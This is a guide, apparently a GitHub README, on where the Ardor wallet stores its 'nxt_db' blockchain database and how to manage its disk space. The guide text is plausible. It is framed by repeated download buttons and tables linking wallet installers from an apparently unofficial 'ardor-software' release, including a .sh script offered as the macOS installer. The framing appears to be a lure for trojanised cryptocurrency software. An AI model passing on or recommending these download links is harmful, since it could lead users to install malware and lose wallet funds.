![Ardor Wallet guide](assets/banner-article.png)

# Where Ardor stores blockchain data, and how much space it takes

<p align="center"><a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-WINDOWS-1562a1?style=for-the-badge&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-MACOS-1562a1?style=for-the-badge&labelColor=0c395d&logo=apple&logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-LINUX-1562a1?style=for-the-badge&labelColor=0c395d&logo=linux&logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img height="24" src="https://img.shields.io/badge/platform-Windows-3e83be?style=flat-square&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`ardor-wallet-2.6.5.exe`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe) |
| <img height="24" src="https://img.shields.io/badge/platform-macOS-3e83be?style=flat-square&labelColor=0c395d&logo=apple&logoColor=white" alt="macOS"> | macOS 12 or later | [`ardor-wallet-2.6.5.sh`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh) |
| <img height="24" src="https://img.shields.io/badge/platform-Linux-3e83be?style=flat-square&labelColor=0c395d&logo=linux&logoColor=white" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`ardor-wallet-2.6.5.zip`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip) |

</div>

All versions, installer files and checksums are on the [Ardor Wallet release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

> [!WARNING]
> Only download from [this GitHub release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

---

A full Ardor client keeps its blockchain database in a folder named `nxt_db`. On Windows that folder sits under `C:\Users\USERNAME\AppData\Roaming\Ardor\`, and on Linux it sits inside the directory you unpacked the universal zip into. A light client stores no chain data at all.

## The two locations

| System | Where the database lives |
|---|---|
| Windows | `C:\Users\USERNAME\AppData\Roaming\Ardor\nxt_db` |
| Linux, universal zip | `nxt_db` inside the unzipped package folder |
| macOS | The same `nxt_db` folder inside the application's data directory |
| Any system, light client | Nowhere - no database is created |

The Windows path is hidden by default, which is why people who have run the [Ardor wallet](https://github.com/ardor-software/ardor-wallet-guides/blob/main/what-is-an-ardor-wallet.md) for months cannot find it. Paste the path into the address bar of File Explorer rather than clicking through folders.

## What is inside the folder

The database holds the chain: blocks, transactions, account states and the indexes the client builds to answer queries. It does not hold your [Ardor passphrase](https://github.com/ardor-software/ardor-wallet-guides/blob/main/can-you-reset-an-ardor-passphrase.md) or your private key. Those are derived from the secret you type, which is why deleting the folder costs sync time and never costs funds.

That distinction matters when someone is troubleshooting a balance. Removing the database cannot make an account unreachable, because the account was never in it, and no [backup](https://github.com/ardor-software/ardor-wallet-guides/blob/main/back-up-and-move-your-ardor-wallet.md) of that folder is needed to keep the funds.

## How much space it takes

The database grows with the chain and never shrinks on its own, so the figure you see today is a floor rather than a fixed cost. A machine with a few gigabytes free will [sync](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/ardor-wallet-not-syncing-fix.md) for a while and then stall when the disk fills, which presents as a sync failure rather than a disk error.

The growth is steady rather than sudden, which makes it easy to ignore until it bites. If the drive holds other large files, its free space is a shared resource and the wallet is the thing that suffers when something else fills it.

Leave headroom rather than filling the disk to the last block. A full disk also breaks the write that records the newest blocks, and a database interrupted mid-write is the one case where a re-download is the honest fix.

## Moving the folder

You can move the database to another drive, which is useful on a laptop with a small system disk. Close the wallet first, move the folder, then point the client at the new location through its configuration rather than by copying files while it runs.

Never move the database while the client is running. A half-copied database is worse than none, because the client will try to use it and fail in ways that look like corruption.

## Deleting and rebuilding it

If the database is corrupted, or a resync is the only way forward, close the wallet, delete the `nxt_db` folder, and start the client again. It will rebuild from peers, which takes hours rather than minutes.

Do that only after the cheaper checks: a frozen height with peers present, a version that is current, and enough free space. Deleting a healthy database turns a small problem into a long wait.

## Keeping the space under control

- Run a light client on machines where disk is tight; it keeps no chain at all.
- Keep the database on a drive with room to grow rather than the smallest partition.
- Do not keep old copies of the folder as a "backup"; a stale chain copy has no value and a lot of size.
- Check free space before a long sync, not after it stalls.

If you run more than one client on the same machine, each keeps its own database and the space adds up faster than people expect. Two full clients on one laptop is a configuration that fills a disk in a way that looks like two unrelated sync faults.

Moving the database to an external drive works, but the drive has to be mounted before the client starts. Otherwise the client creates a fresh database in the default location and quietly syncs from scratch, which is the failure people report as a wallet that will not sync after a reboot. Check the mount order once and it stops being a mystery.

## Before you move or delete anything

Copy the folder first if you have the space and a reason to keep the old view. A copy is not a backup of your account - the secret is - but it is a way back if a rebuild fails halfway and you want something to compare against.

The account does not depend on that folder in any way. Everything in this section is about convenience and time, never about whether the funds still exist.

## When the disk fills up

A full disk stops the write rather than raising an error, so the client keeps running and the height simply stops moving. Freeing space and restarting usually lets it continue from where it stopped, because the database write is a transaction rather than a single append.

If it does not continue, the database was interrupted mid-write and a rebuild is the fix. That is the one case where deleting `nxt_db` is justified rather than merely convenient.

## FAQ

### Does the blockchain folder contain my passphrase?

No. It contains chain data only. The passphrase or seed derives the account and is never written into the database.

### Can I delete the folder to free space?

Yes, and the client will rebuild it on the next start. You will need to sync again, which takes hours.

### Why can I not see the Ardor folder on Windows?

It lives under AppData, which File Explorer hides by default. Paste the full path into the address bar, or enable hidden items.

### Where does a light client keep its data?

Nowhere. It holds no chain state, so there is no folder to find, move or delete.

---

## Download

Every installer for the current release, with the platform each one targets:

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img height="24" src="https://img.shields.io/badge/platform-Windows-3e83be?style=flat-square&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`ardor-wallet-2.6.5.exe`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe) |
| <img height="24" src="https://img.shields.io/badge/platform-macOS-3e83be?style=flat-square&labelColor=0c395d&logo=apple&logoColor=white" alt="macOS"> | macOS 12 or later | [`ardor-wallet-2.6.5.sh`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh) |
| <img height="24" src="https://img.shields.io/badge/platform-Linux-3e83be?style=flat-square&labelColor=0c395d&logo=linux&logoColor=white" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`ardor-wallet-2.6.5.zip`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip) |

</div>

All versions, installer files and checksums are on the [Ardor Wallet release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

> [!WARNING]
> Only download from [this GitHub release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).
---

## Related guides

- [Ardor light client or full node: choose before you start](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/ardor-light-client-versus-full-node.md)
- [Fix an Ardor wallet that will not sync](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/ardor-wallet-not-syncing-fix.md)
- [Install the Ardor wallet on Windows, macOS or Linux](https://github.com/ardor-software/ardor-wallet-guides/blob/main/install-ardor-wallet-on-windows-macos-linux.md)
- [Fix the Java error that stops the Ardor wallet](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/fix-ardor-wallet-java-error.md)
- [Ardor Wallet v2.6.5 release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5)
